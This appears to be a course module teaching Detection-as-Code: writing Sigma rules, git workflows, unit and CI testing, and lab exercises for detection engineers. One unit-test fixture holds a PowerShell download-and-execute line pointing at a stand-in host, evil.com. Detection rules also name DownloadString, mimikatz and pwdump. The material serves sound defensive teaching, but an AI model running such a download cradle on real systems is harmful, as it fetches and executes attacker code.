# Module 1: Foundations of Detection-as-Code

## Learning Objectives

By the end of this module, you will:

- Understand the core principles of Detection-as-Code
- Identify limitations of traditional SIEM approaches
- Evaluate modern detection engineering tools and practices
- Apply version control to security detections
- Design testable, maintainable detection rules

## Table of Contents

1. [Introduction to Detection-as-Code](#1-introduction-to-detection-as-code)
2. [Traditional vs. Modern Detection Engineering](#2-traditional-vs-modern-detection-engineering)
3. [The Detection-as-Code Philosophy](#3-the-detection-as-code-philosophy)
4. [Ecosystem and Tools](#4-ecosystem-and-tools)
5. [Version Control for Detections](#5-version-control-for-detections)
6. [Testing and Validation](#6-testing-and-validation)
7. [Lab Exercise](#7-lab-exercise)

---

## 1. Introduction to Detection-as-Code

### What is Detection-as-Code?

Detection-as-Code is a methodology that applies software engineering principles to security detection development:

- **Detections as source code:** Rules written in high-level languages
- **Version controlled:** Git-based workflows for collaboration
- **Automated testing:** Unit tests, integration tests, validation
- **CI/CD pipelines:** Automated deployment and rollback
- **Peer reviewed:** Code reviews for quality assurance
- **Reproducible:** Consistent behavior across environments

### Why Detection-as-Code Matters

**Traditional Challenges:**
- Detections locked in proprietary SIEM interfaces
- No version history or change tracking
- Manual deployment processes
- Limited testing capabilities
- Difficult knowledge sharing
- Vendor lock-in

**Detection-as-Code Benefits:**
- Portable across security platforms
- Full audit trail of changes
- Automated testing and validation
- Rapid iteration and deployment
- Team collaboration via pull requests
- Open source and sharing

### Key Principles

1. **Treat detections like production code**
2. **Test before deploy**
3. **Review all changes**
4. **Document thoroughly**
5. **Measure effectiveness**
6. **Iterate continuously**

---

## 2. Traditional vs. Modern Detection Engineering

### Traditional SIEM Approach

```
Analyst → SIEM GUI → Create Rule → Manual Test → Deploy → Monitor
```

**Limitations:**
- Point-and-click interfaces limit automation
- Rules stored in databases, not code
- No systematic testing framework
- Difficult to track who changed what
- Vendor-specific query languages
- Export/import is cumbersome

### Modern Detection-as-Code Approach

```
Engineer → Code Editor → Write Detection → Unit Test → 
Code Review → CI/CD Pipeline → Deploy → Monitor → Iterate
```

**Advantages:**
- Standard programming tools and workflows
- Git-based version control
- Automated testing at multiple levels
- Full change history and attribution
- Platform-agnostic rule formats (Sigma, KQL)
- Easy collaboration and sharing

### Evolution Timeline

| Era | Approach | Example |
|-----|----------|---------|
| 2000s | Manual correlation in SIEM | ArcSight ESM, Splunk |
| 2010s | Scripted alert generation | Python scripts, APIs |
| 2015+ | Detection-as-Code frameworks | Sigma, StreamAlert |
| 2020+ | Advanced detection platforms | Matano, Panther, Detection Lab |

---

## 3. The Detection-as-Code Philosophy

### Core Tenets

#### 1. Infrastructure as Code Mindset
Apply IaC principles to security detections:
- Declarative rule definitions
- Idempotent deployments
- Environment parity (dev/staging/prod)

#### 2. Software Engineering Rigor
Adopt proven development practices:
- Code reviews and approval gates
- Continuous integration
- Automated testing
- Performance benchmarking

#### 3. Collaboration and Sharing
Foster community-driven security:
- Open source detection rules
- Threat hunting as research
- Shared knowledge repositories
- Cross-organizational collaboration

#### 4. Measurable Effectiveness
Data-driven detection improvement:
- False positive rates
- Coverage metrics (MITRE ATT&CK)
- Detection latency
- Alert actionability scores

### The Detection Development Lifecycle

```
Research → Design → Implement → Test → Review → 
Deploy → Monitor → Tune → Document → Share
```

**1. Research Phase**
- Identify threat or technique
- Study attack patterns
- Review threat intelligence
- Map to MITRE ATT&CK

**2. Design Phase**
- Define detection logic
- Identify data sources
- Set success criteria
- Plan test cases

**3. Implementation Phase**
- Write detection code
- Follow coding standards
- Add inline documentation
- Create configuration

**4. Testing Phase**
- Unit tests (rule logic)
- Integration tests (data flow)
- False positive testing
- Performance validation

**5. Review Phase**
- Peer code review
- Security review
- Performance review
- Documentation review

**6. Deployment Phase**
- Stage to test environment
- Validate in production-like setting
- Gradual rollout
- Monitor for issues

**7. Monitoring Phase**
- Track alert volume
- Measure false positives
- Assess detection latency
- Review alert quality

**8. Tuning Phase**
- Adjust thresholds
- Refine exclusions
- Optimize performance
- Update documentation

**9. Documentation Phase**
- Document detection rationale
- Provide investigation guidance
- Share lessons learned
- Update runbooks

**10. Sharing Phase**
- Contribute to open source
- Share with community
- Present findings
- Iterate based on feedback

---

## 4. Ecosystem and Tools

### Detection Formats and Standards

#### Sigma
- **Purpose:** Universal detection rule format
- **Format:** YAML-based
- **Backend Support:** 50+ platforms (Splunk, Elastic, QRadar)
- **Community:** SigmaHQ with 3000+ rules

```yaml
title: Suspicious PowerShell Download
status: experimental
logsource:
    product: windows
    service: powershell
detection:
    selection:
        EventID: 4104
        ScriptBlockText|contains:
            - 'DownloadString'
            - 'DownloadFile'
    condition: selection
```

#### YARA-L (Chronicle)
- **Purpose:** Google Chronicle detection language
- **Syntax:** SQL-like with event correlation
- **Use Case:** Multi-event detection logic

#### KQL (Kusto Query Language)
- **Purpose:** Azure Sentinel, Microsoft 365 Defender
- **Syntax:** Functional query language
- **Strength:** Advanced analytics and ML integration

### Detection-as-Code Platforms

#### 1. **StreamAlert (Airbnb)**
- Python-based detection framework
- Lambda-powered event processing
- S3 data sources
- Open source

#### 2. **Panther**
- Python detection rules
- Cloud-native architecture
- Built-in threat intelligence
- Commercial/open source

#### 3. **Matano**
- Rust-based security data lake
- Open source
- S3-based storage
- Apache Iceberg tables

#### 4. **DetectionLab**
- Local testing environment
- Pre-built threat scenarios
- Multiple log sources
- Training and validation

### Supporting Tools

| Category | Tool | Purpose |
|----------|------|---------|
| Validation | Sigma CLI | Rule syntax validation |
| Conversion | sigmac | Backend translation |
| Testing | Atomic Red Team | Adversary simulation |
| Coverage | ATT&CK Navigator | Technique mapping |
| Development | VS Code + Extensions | Rule authoring |
| CI/CD | GitHub Actions | Automated deployment |

---

## 5. Version Control for Detections

### Git Workflow for Detections

#### Repository Structure
```
detections/
├── rules/
│   ├── windows/
│   │   ├── process_creation/
│   │   │   └── powershell_suspicious.yml
│   │   └── registry/
│   └── linux/
├── tests/
│   └── test_powershell_suspicious.py
├── .github/
│   └── workflows/
│       └── validate.yml
└── README.md
```

#### Branch Strategy

**Feature Branch Workflow:**
```bash
# Create detection branch
git checkout -b detection/lateral-movement-rdp

# Develop and test
vim rules/windows/network/rdp_bruteforce.yml
python tests/test_rdp_detection.py

# Commit with meaningful message
git add rules/windows/network/rdp_bruteforce.yml
git commit -m "Add RDP brute force detection

Detects multiple failed RDP authentication attempts
Maps to MITRE T1110.001 - Brute Force: Password Guessing
Tested against simulated attack traffic"

# Push and create pull request
git push origin detection/lateral-movement-rdp
```

#### Commit Message Standards

**Format:**
```
<type>: <short summary>

<detailed description>

MITRE: <ATT&CK technique ID>
Data Source: <log source>
FP Rate: <estimated false positive rate>
```

**Types:**
- `feat:` New detection rule
- `fix:` Fix false positive or bug
- `tune:` Threshold or parameter adjustment
- `docs:` Documentation updates
- `test:` Test additions or modifications
- `refactor:` Rule restructuring

**Example:**
```
feat: Add Kerberoasting detection

Identifies RC4 encryption requests for service tickets
with common roasting patterns.

MITRE: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
Data Source: Windows Event ID 4769
FP Rate: <1% in tested environments
```

### Code Review Best Practices

#### Review Checklist
- [ ] Detection logic is sound
- [ ] MITRE ATT&CK mapping is accurate
- [ ] Data sources are available
- [ ] False positive potential is acceptable
- [ ] Tests cover edge cases
- [ ] Documentation is complete
- [ ] Performance impact is minimal

#### Review Comments Example
```
# Reviewer comment on PR
"Good detection logic, but consider adding an exclusion 
for scheduled tasks to reduce FPs. Also, can we correlate 
this with failed login events for higher confidence?"

# Author response
"Added scheduled task exclusion in commit abc123. 
For correlation, I'll create a follow-up detection 
in a separate PR to keep this focused."
```

---

## 6. Testing and Validation

### Testing Pyramid for Detections

```
       /\
      /  \  End-to-End Tests
     /----\  (Full pipeline validation)
    /      \
   / Integ. \ Integration Tests
  /  Tests   \ (Rule + data flow)
 /------------\
/   Unit Tests  \ Unit Tests
/----------------\ (Logic validation)
```

### Unit Testing Detection Logic

**Example: Testing a Sigma rule**

```python
# tests/test_suspicious_powershell.py
import pytest
from detection_engine import SigmaRule

def test_powershell_download_detection():
    """Test detection of PowerShell download commands"""
    rule = SigmaRule.from_file('rules/windows/powershell_download.yml')
    
    # Positive case
    malicious_event = {
        'EventID': 4104,
        'ScriptBlockText': 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
    }
    assert rule.match(malicious_event) == True
    
    # Negative case
    benign_event = {
        'EventID': 4104,
        'ScriptBlockText': 'Get-Process | Where-Object {$_.CPU -gt 100}'
    }
    assert rule.match(benign_event) == False
    
    # Edge case: partial match
    edge_event = {
        'EventID': 4104,
        'ScriptBlockText': 'Write-Host "DownloadString is a function"'
    }
    # Should this trigger? Document the decision
    assert rule.match(edge_event) == False  # Context matters
```

### Integration Testing

Test the full detection pipeline:

```python
# tests/integration/test_detection_pipeline.py
def test_end_to_end_detection():
    """Simulate real log ingestion and detection"""
    
    # 1. Ingest sample logs
    pipeline = DetectionPipeline()
    pipeline.ingest_logs('tests/data/sample_powershell_logs.json')
    
    # 2. Run detection rules
    alerts = pipeline.run_detections()
    
    # 3. Validate alerts
    assert len(alerts) == 2  # Expected 2 alerts
    assert alerts[0].rule_name == 'Suspicious PowerShell Download'
    assert alerts[0].severity == 'high'
```

### False Positive Testing

**Strategies:**
1. **Baseline testing:** Run against known-good logs
2. **Environmental testing:** Test in dev, staging, prod
3. **Time-based testing:** Monitor for 24-48 hours
4. **Exclusion validation:** Verify exceptions work correctly

**Example baseline test:**
```python
def test_baseline_false_positives():
    """Ensure rule doesn't fire on baseline activity"""
    rule = SigmaRule.from_file('rules/windows/suspicious_scheduled_task.yml')
    
    # Load 1 week of baseline logs
    baseline_logs = load_baseline('data/baseline_windows_week1.json')
    
    alerts = [rule.match(log) for log in baseline_logs if rule.match(log)]
    
    # Should have zero or near-zero alerts on baseline
    fp_rate = len(alerts) / len(baseline_logs)
    assert fp_rate < 0.001, f"False positive rate {fp_rate} too high"
```

### Continuous Validation

**GitHub Actions CI/CD Pipeline:**

```yaml
# .github/workflows/validate-detections.yml
name: Validate Detections

on: [pull_request]

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Validate Sigma Syntax
        run: |
          pip install sigma-cli
          sigma validate rules/**/*.yml
      
      - name: Run Unit Tests
        run: |
          pytest tests/unit/
      
      - name: Check MITRE Coverage
        run: |
          python scripts/check_attack_coverage.py
      
      - name: Lint Rule Files
        run: |
          yamllint rules/
```

---

## 7. Lab Exercise

### Exercise 1: Convert Traditional Rule to Detection-as-Code

**Scenario:** You have a traditional SIEM rule that detects multiple failed SSH logins.

**Traditional SIEM Rule (pseudocode):**
```
IF (event.type = "ssh_login_failed" 
    AND count(events by source_ip) > 5 
    WITHIN 5 minutes)
THEN alert "Potential SSH Brute Force"
```

**Task:** Convert this to a Sigma rule following Detection-as-Code principles.

**Deliverables:**
1. Sigma YAML rule file
2. Unit test in Python or Rust
3. Git commit with proper message
4. Documentation explaining detection logic

**Starter Template:**
```yaml
title: [Your Title]
id: [Generate UUID]
status: experimental
description: |
    [Describe the detection]
references:
    - [Link to threat intelligence]
author: [Your name]
date: 2024/01/01
modified: 2024/01/01
tags:
    - attack.credential_access
    - attack.t1110.001
logsource:
    product: linux
    service: auth
detection:
    selection:
        # Your detection logic here
    condition: selection
falsepositives:
    - [List potential false positives]
level: high
```

### Exercise 2: Implement Version Control Workflow

**Task:** Set up a local git repository for detections and practice the feature branch workflow.

**Steps:**
1. Initialize git repository
2. Create directory structure
3. Add a detection rule
4. Create feature branch
5. Make changes
6. Commit with proper message
7. (Simulate) Code review
8. Merge to main

**Validation:**
- Clean git history
- Meaningful commit messages
- Proper branching strategy
- Detection rule validates

### Exercise 3: Build a Simple Test Suite

**Task:** Create a test suite for a provided Sigma rule.

**Provided Rule:** Windows Service Creation
```yaml
title: Suspicious Service Creation
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
        ServiceName|contains:
            - 'mimikatz'
            - 'pwdump'
    condition: selection
```

**Requirements:**
1. Write 3 positive test cases (should alert)
2. Write 3 negative test cases (should not alert)
3. Write 2 edge cases
4. Document expected behavior

---

## Knowledge Check

### Questions

1. **What are the three main benefits of Detection-as-Code over traditional SIEM rules?**

2. **Explain the detection development lifecycle. Why is each phase important?**

3. **What is Sigma, and why is it valuable for detection engineers?**

4. **Describe the git workflow for creating a new detection rule.**

5. **What types of testing should be performed on detection rules?**

### Practical Challenge

**Build a "Hello World" detection:**

1. Create a Sigma rule that detects any Windows Event ID 4688 (process creation) for `notepad.exe`
2. Write a unit test that validates:
   - Matches when process name is notepad.exe
   - Doesn't match for other processes
3. Commit to git with proper message format
4. Document the detection in README format

---

## Resources

### Essential Reading
- [Sigma Specification](https://github.com/SigmaHQ/sigma-specification)
- [Detection Engineering Maturity Matrix](https://kyle-bailey.medium.com/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

### Tools to Install
```bash
# Sigma CLI
pip install sigma-cli

# Git (if not installed)
apt-get install git  # or: brew install git

# YAML linter
pip install yamllint
```

### Community Resources
- [Detection Engineering Weekly Newsletter](https://detectionengineering.io/)
- [Sigma Rules Repository](https://github.com/SigmaHQ/sigma)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

---

## Next Steps

After completing this module:

1. ✅ Understand Detection-as-Code principles
2. ✅ Know the ecosystem and tools
3. ✅ Practice git workflow for detections
4. ✅ Write basic tests for detection rules

**Continue to:** [Module 2: Rust Fundamentals for Security](../module-02-rust-basics/README.md)

---

## Feedback

Found an issue or have suggestions? Open an issue or pull request on GitHub!
